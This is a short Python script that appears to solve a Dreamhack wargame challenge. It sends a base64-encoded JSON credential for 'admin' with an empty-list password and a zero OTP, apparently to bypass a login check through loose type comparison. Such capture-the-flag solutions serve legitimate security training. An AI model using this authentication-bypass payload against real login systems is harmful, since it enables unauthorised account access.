# Wargame site link: https://dreamhack.io/wargame/challenges/1213

import requests
import string
import re
import json
import base64

# 서버 정보
HOST = "(Your URL)"

user_info = {
    "id" : "admin",
    "pw" : [],
    "otp" : 000
}

payload = {"cred" : base64.b64encode(json.dumps(user_info).encode()).decode()}

res = requests.post(HOST, data = payload)

print(res.text)
